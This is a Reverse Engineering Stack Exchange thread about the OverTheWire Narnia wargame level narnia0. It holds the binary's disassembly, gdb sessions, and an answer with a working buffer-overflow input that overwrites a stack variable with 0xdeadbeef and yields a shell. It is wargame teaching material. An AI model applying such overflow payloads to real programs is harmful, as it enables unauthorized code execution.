{
    "title": "0xdeadbeef in Exploitation? [closed]",
    "link": "https://reverseengineering.stackexchange.com/questions/4686/0xdeadbeef-in-exploitation",
    "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<div>\n<aside class=\"s-notice s-notice__info post-notice js-post-notice mb16\" role=\"status\">\n<div class=\"d-flex fd-column fw-nowrap\">\n<div class=\"d-flex fw-nowrap\">\n<div class=\"flex--item wmn0 fl1 lh-lg\">\n<div class=\"flex--item fl1 lh-lg\">\n<div>\n<b>Closed</b>. This question needs <a href=\"/help/closed-questions\">details or clarity</a>. It is not currently accepting answers.\n                                \n                            </div>\n</div>\n</div>\n</div>\n</div>\n<hr class=\"my12 outline-none baw0 bb bc-blue-400\"/>\n<div class=\"fw-nowrap fc-black-500\">\n<div class=\"d-flex fd-column lh-md\">\n<div class=\"mb0 d-flex\">\n<div class=\"flex--item mr8\">\n<svg aria-hidden=\"true\" class=\"svg-icon iconLightbulb\" height=\"18\" viewbox=\"0 0 18 18\" width=\"18\"><path d=\"M15 6.38A6.5 6.5 0 0 0 7.78.04h-.02A6.5 6.5 0 0 0 2.05 5.6a6.3 6.3 0 0 0 2.39 5.75c.49.39.76.93.76 1.5v.24c0 1.07.89 1.9 1.92 1.9h2.75c1.04 0 1.92-.83 1.92-1.9v-.2c0-.6.26-1.15.7-1.48A6.3 6.3 0 0 0 15 6.37M4.03 5.85A4.5 4.5 0 0 1 8 2.02a4.5 4.5 0 0 1 5 4.36 4.3 4.3 0 0 1-1.72 3.44c-.98.74-1.5 1.9-1.5 3.08v.1H7.2v-.14c0-1.23-.6-2.34-1.53-3.07a4.3 4.3 0 0 1-1.64-3.94M10 18a1 1 0 0 0 0-2H7a1 1 0 1 0 0 2z\"></path></svg>\n</div>\n<p><b>Want to improve this question?</b> Add details and clarify the problem by <a href=\"/posts/4686/edit\">editing this post</a>.</p>\n</div>\n<div class=\"mb0 mt6 d-flex\">\n<p class=\"ml24 pl2\">Closed <span class=\"relativetime\" title=\"2014-06-25 10:37:50Z\">10 years ago</span>.</p>\n</div>\n<div class=\"ml24 pl2\">\n</div>\n</div>\n</div>\n<div class=\"mt24 d-flex gsx gs8\">\n<a class=\"s-btn s-btn__outlined flex--item js-post-notice-edit-post\" href=\"/posts/4686/edit\">\n                        Improve this question\n                    </a>\n</div>\n</aside>\n</div>\n<p>I am playing a wargame at <a href=\"http://overthewire.org/wargames/narnia/\" rel=\"nofollow\">narnia.labs.overthewire.org</a>. I came arcoss a level called <code>narnia0</code> which requires me to change the value <code>0x414141414</code> into <code>0xdeadbeef</code>. So far, I have already looked at the source code and reverse engineered the binary. What is 0xdeadbeef in exploitation and how do I change the value from <code>0x414141</code> in <code>ebp</code> to <code>0xdeadbeef</code>. I've done some research in hexadecimal values/conversion for this challenge.</p>\n<p>What is <code>0xdeadbeef</code> in general and how does it realate in exploiation? How do I change <code>ebp</code> value <code>0x41414141</code> to <code>0xdeadbeef</code> ?</p>\n<p>You can see my problem analysis below:</p>\n<pre><code>080484c4 &lt;main&gt;:\n  80484c4:       55                      push   %ebp\n  80484c5:       89 e5                   mov    %esp,%ebp\n  80484c7:       83 e4 f0                and    $0xfffffff0,%esp\n  80484ca:       83 ec 30                sub    $0x30,%esp\n  80484cd:       c7 44 24 2c 41 41 41    movl   $0x41414141,0x2c(%esp)\n  80484d4:       41 \n  80484d5:       c7 04 24 40 86 04 08    movl   $0x8048640,(%esp)\n  80484dc:       e8 cf fe ff ff          call   80483b0 &lt;puts@plt&gt;\n  80484e1:       b8 73 86 04 08          mov    $0x8048673,%eax\n  80484e6:       89 04 24                mov    %eax,(%esp)\n  80484e9:       e8 b2 fe ff ff          call   80483a0 &lt;printf@plt&gt;\n  80484ee:       b8 89 86 04 08          mov    $0x8048689,%eax\n  80484f3:       8d 54 24 18             lea    0x18(%esp),%edx\n  80484f7:       89 54 24 04             mov    %edx,0x4(%esp)\n  80484fb:       89 04 24                mov    %eax,(%esp)\n  80484fe:       e8 fd fe ff ff          call   8048400 &lt;__isoc99_scanf@plt&gt;\n  8048503:       b8 8e 86 04 08          mov    $0x804868e,%eax\n  8048508:       8d 54 24 18             lea    0x18(%esp),%edx\n  804850c:       89 54 24 04             mov    %edx,0x4(%esp)\n  8048510:       89 04 24                mov    %eax,(%esp)\n  8048513:       e8 88 fe ff ff          call   80483a0 &lt;printf@plt&gt;\n  8048518:       b8 97 86 04 08          mov    $0x8048697,%eax\n  804851d:       8b 54 24 2c             mov    0x2c(%esp),%edx \n  8048521:       89 54 24 04             mov    %edx,0x4(%esp)\n  8048525:       89 04 24                mov    %eax,(%esp)\n  8048528:       e8 73 fe ff ff          call   80483a0 &lt;printf@plt&gt;\n  804852d:       81 7c 24 2c ef be ad    cmpl   $0xdeadbeef,0x2c(%esp)\n  8048534:       de \n  8048535:       75 13                   jne    804854a &lt;main+0x86&gt;\n  8048537:       c7 04 24 a4 86 04 08    movl   $0x80486a4,(%esp)\n  804853e:       e8 7d fe ff ff          call   80483c0 &lt;system@plt&gt;\n  8048543:       b8 00 00 00 00          mov    $0x0,%eax\n  8048548:       c9                      leave  \n  8048549:       c3                      ret    \n  804854a:       c7 04 24 ac 86 04 08    movl   $0x80486ac,(%esp)\n  8048551:       e8 5a fe ff ff          call   80483b0 &lt;puts@plt&gt;\n  8048556:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)\n  804855d:       e8 7e fe ff ff          call   80483e0 &lt;exit@plt&gt;\n  8048562:       90                      nop\n  8048563:       90                      nop\n  8048564:       90                      nop\n  8048565:       90                      nop\n  8048566:       90                      nop\n  8048567:       90                      nop\n  8048568:       90                      nop\n  8048569:       90                      nop\n  804856a:       90                      nop\n  804856b:       90                      nop\n  804856c:       90                      nop\n  804856d:       90                      nop\n</code></pre>\n<p>I know the binary takes input from the user and then prints a challenge message. And, also, I know somewhere else in the binary it does compare to a value and takes two paths of either you getting the flag or trying again. For solving this challenge I have already tried overwriting the <code>ebp</code> register but nothing.</p>\n<pre><code>narnia0@melinda:/games/narnia$ gdb ./narnia0\n(gdb) dissasemble main\nUndefined command: \"dissasemble\".  Try \"help\".\n(gdb) b * main\nBreakpoint 1 at 0x80484c4\n(gdb) b * main+105 \nBreakpoint 2 at 0x804852d\n(gdb) r\nStarting program: /games/narnia/narnia0 \nBreakpoint 1, 0x080484c4 in main ()\n(gdb) n\nSingle stepping until exit from function main,\nwhich has no line number information.\nCorrect val's value from 0x41414141 -&gt; 0xdeadbeef!\nHere is your chance: AAAAAAAAAAAA\nbuf: AAAAAAAAAAAA\nval: 0x41414141\nBreakpoint 2, 0x0804852d in main ()\n(gdb) i r\neax            0x10     16\necx            0x0      0\nedx            0x0      0\nebx            0xf7fcdff4       -134422540\nesp            0xffffd6f0       0xffffd6f0\nebp            0xffffd728       0xffffd728\nesi            0x0      0\nedi            0x0      0\neip            0x804852d        0x804852d &lt;main+105&gt;\neflags         0x286    [ PF SF IF ]\ncs             0x23     35\nss             0x2b     43\nds             0x2b     43\nes             0x2b     43\nfs             0x0      0\ngs             0x63     99\n</code></pre>\n</div>",
    "votes": "2",
    "answers": 1,
    "views": "17k",
    "tags": [
        "exploit"
    ],
    "user": "user3286303",
    "time": "10 years ago",
    "comments": [
        {
            "user": "0xC0000022L",
            "text": "<span class=\"comment-copy\">Could you please clarify what it is you want to know? Be specific!</span>",
            "time": null
        },
        {
            "user": "user3286303",
            "text": "<span class=\"comment-copy\">What i am asking is what is 0xdeedbeef and how it relates to exploiation</span>",
            "time": null
        },
        {
            "user": "0xC0000022L",
            "text": "<span class=\"comment-copy\">there is only one connection here: a hacker wrote the sample code and decided it'd be cool to use hexspeak (see perrors answer). The value could be another and the program would still work for the corresponding input.</span>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<div class=\"s-prose js-post-body\" itemprop=\"text\">\n<p>This should be <code>0xdeadbeef</code> (dead beef), because it is a word that can be spelled in hexadecimal characters. </p>\n<p>We usually call this <a href=\"http://en.wikipedia.org/wiki/Hexspeak\" rel=\"nofollow\">Hexspeak</a>. Other well knowns hexadecimal words are <code>0xcafebabe</code> or <code>0xd15ea5e</code>. Together with <a href=\"http://en.wikipedia.org/wiki/Leet\" rel=\"nofollow\">133tspeak</a>, it might lead to some interesting (and funny) wording.</p>\n<p>Concerning the exploitation of the challenge, I didn't try... But, you are given one chance through the \"<code>Here is your chance</code>\" prompt. So, try, for example, to do:</p>\n<pre><code>python -c 'print(\"A\"*20 + \"\\xef\\xbe\\xad\\xde\")' | ./narnia0\n</code></pre>\n<p>Here is my full log:</p>\n<pre><code>(gdb) disas main\nDump of assembler code for function main:\n   0x080484c4 &lt;+0&gt;: push   %ebp\n   0x080484c5 &lt;+1&gt;: mov    %esp,%ebp\n   0x080484c7 &lt;+3&gt;: and    $0xfffffff0,%esp\n   0x080484ca &lt;+6&gt;: sub    $0x30,%esp\n   0x080484cd &lt;+9&gt;: movl   $0x41414141,0x2c(%esp)\n   0x080484d5 &lt;+17&gt;:    movl   $0x8048640,(%esp)\n   0x080484dc &lt;+24&gt;:    call   0x80483b0 &lt;puts@plt&gt;\n   0x080484e1 &lt;+29&gt;:    mov    $0x8048673,%eax\n   0x080484e6 &lt;+34&gt;:    mov    %eax,(%esp)\n   0x080484e9 &lt;+37&gt;:    call   0x80483a0 &lt;printf@plt&gt;\n   0x080484ee &lt;+42&gt;:    mov    $0x8048689,%eax\n   0x080484f3 &lt;+47&gt;:    lea    0x18(%esp),%edx\n   0x080484f7 &lt;+51&gt;:    mov    %edx,0x4(%esp)\n   0x080484fb &lt;+55&gt;:    mov    %eax,(%esp)\n   0x080484fe &lt;+58&gt;:    call   0x8048400 &lt;__isoc99_scanf@plt&gt;\n   0x08048503 &lt;+63&gt;:    mov    $0x804868e,%eax\n   0x08048508 &lt;+68&gt;:    lea    0x18(%esp),%edx\n   0x0804850c &lt;+72&gt;:    mov    %edx,0x4(%esp)\n   0x08048510 &lt;+76&gt;:    mov    %eax,(%esp)\n   0x08048513 &lt;+79&gt;:    call   0x80483a0 &lt;printf@plt&gt;\n   0x08048518 &lt;+84&gt;:    mov    $0x8048697,%eax\n   0x0804851d &lt;+89&gt;:    mov    0x2c(%esp),%edx\n   0x08048521 &lt;+93&gt;:    mov    %edx,0x4(%esp)\n   0x08048525 &lt;+97&gt;:    mov    %eax,(%esp)\n   0x08048528 &lt;+100&gt;:   call   0x80483a0 &lt;printf@plt&gt;\n   0x0804852d &lt;+105&gt;:   cmpl   $0xdeadbeef,0x2c(%esp)\n   0x08048535 &lt;+113&gt;:   jne    0x804854a &lt;main+134&gt;\n   0x08048537 &lt;+115&gt;:   movl   $0x80486a4,(%esp)\n   0x0804853e &lt;+122&gt;:   call   0x80483c0 &lt;system@plt&gt;\n   0x08048543 &lt;+127&gt;:   mov    $0x0,%eax\n   0x08048548 &lt;+132&gt;:   leave  \n   0x08048549 &lt;+133&gt;:   ret    \n   0x0804854a &lt;+134&gt;:   movl   $0x80486ac,(%esp)\n   0x08048551 &lt;+141&gt;:   call   0x80483b0 &lt;puts@plt&gt;\n   0x08048556 &lt;+146&gt;:   movl   $0x1,(%esp)\n   0x0804855d &lt;+153&gt;:   call   0x80483e0 &lt;exit@plt&gt;\nEnd of assembler dump.\n(gdb) x /s 0x8048640 \n0x8048640:   \"Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\"\n(gdb) x /s 0x8048673\n0x8048673:   \"Here is your chance: \"\n(gdb) x /s 0x8048689\n0x8048689:   \"%24s\"\n(gdb) quit\nnarnia0@melinda:/narnia$ python -c 'print(\"A\"*20 + \"\\xde\\xad\\xbe\\xef\")' | ./narnia0 \nCorrect val's value from 0x41414141 -&gt; 0xdeadbeef!\nHere is your chance: buf: AAAAAAAAAAAAAAAAAAAAޭ��\nval: 0xefbeadde\nWAY OFF!!!!\nnarnia0@melinda:/narnia$ python -c 'print(\"A\"*20 + \"\\xef\\xbe\\xad\\xde\")' | ./narnia0 \nCorrect val's value from 0x41414141 -&gt; 0xdeadbeef!\nHere is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�\nval: 0xdeadbeef\n</code></pre>\n<p>I started by disassembling the <code>main</code> function. Then, I looked at the format strings I could find in the program. The one from the <code>scanf</code> told me that the size of the input string is 24 bytes. I assumed that the buffer is less than that and that the overflow occurs at the end of the string (the last four bytes). Then, I first did a stupid mistake by entering the <code>0xdeadbeef</code> in big-endian. And, finally, I got it right (second try).</p>\n<p>But, I got lucky (or I just did too many of these things recently...).</p>\n<p><strong>EDIT</strong>: I can't keep the shell open with the Python scripting, the only way out that I found was to display the string with an <code>echo</code> and copy/paste it :</p>\n<pre><code>narnia0@melinda:/narnia$ echo $'AAAAAAAAAAAAAAAAAAAA\\xef\\xbe\\xad\\xde\\xaf'\nAAAAAAAAAAAAAAAAAAAAﾭޯ\nnarnia0@melinda:/narnia$ ./narnia0 \nCorrect val's value from 0x41414141 -&gt; 0xdeadbeef!\nHere is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ\nbuf: AAAAAAAAAAAAAAAAAAAAﾭ�\nval: 0xdeadbeef\n$ \n</code></pre>\n</div>",
            "votes": "3",
            "user": "perror",
            "time": "Jun 24, 2014 at 20:47",
            "is_accepted": false,
            "comments": [
                {
                    "user": "user3286303",
                    "text": "<span class=\"comment-copy\">But perror how this used in exploiation</span>",
                    "time": null
                },
                {
                    "user": "user3286303",
                    "text": "<span class=\"comment-copy\">yeah so i enter the hexadecimal transaliton of 0xdeedbeef?</span>",
                    "time": null
                },
                {
                    "user": "user3286303",
                    "text": "<span class=\"comment-copy\">Thanks perror one more question how do i get better at exploiation i don't want to be fooled by something like this XD</span>",
                    "time": null
                },
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\"><i>exploitation</i>... And, I am not quite sure I understand your question... Could you rephrase it ? This bug is just a buffer-overflow, you can learn about it just by Googling a bit. It has been extensively described on the Web.</span>",
                    "time": null
                },
                {
                    "user": "perror",
                    "text": "<span class=\"comment-copy\">There is no magic recipes, just learn and understand how things are at the assembly level.</span>",
                    "time": null
                }
            ]
        }
    ]
}